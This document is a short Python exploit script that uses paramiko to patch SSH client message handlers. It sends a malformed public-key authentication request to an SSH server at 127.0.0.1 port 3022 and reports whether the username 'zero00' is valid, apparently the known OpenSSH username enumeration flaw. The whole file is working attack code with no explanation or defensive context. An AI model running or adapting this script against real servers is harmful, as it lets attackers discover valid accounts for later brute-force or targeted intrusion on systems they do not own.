import socket
import sys
import warnings
from cryptography.utils import CryptographyDeprecationWarning

with warnings.catch_warnings():
    warnings.filterwarnings('ignore', category=CryptographyDeprecationWarning)
    import paramiko


class InvalidUsername(Exception):
    pass


def add_boolean(*args, **kwargs):
    pass


old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]


def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)


def userauth_failure(*args, **kwargs):
    raise InvalidUsername()


paramiko.auth_handler.AuthHandler._client_handler_table.update({
    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
})

sock = socket.socket()
try:
    sock.connect(('127.0.0.1', 3022))
except socket.error:
    print('[-] Failed to connect')
    sys.exit(1)

transport = paramiko.transport.Transport(sock)
try:
    transport.start_client()
except paramiko.ssh_exception.SSHException:
    print('[-] Failed to negotiate SSH transport')
    sys.exit(2)

try:
    transport.auth_publickey('zero00', paramiko.RSAKey.generate(2048))
except InvalidUsername:
    print('[*] Invalid username')
    sys.exit(3)
except paramiko.ssh_exception.AuthenticationException:
    print('[+] Valid username')
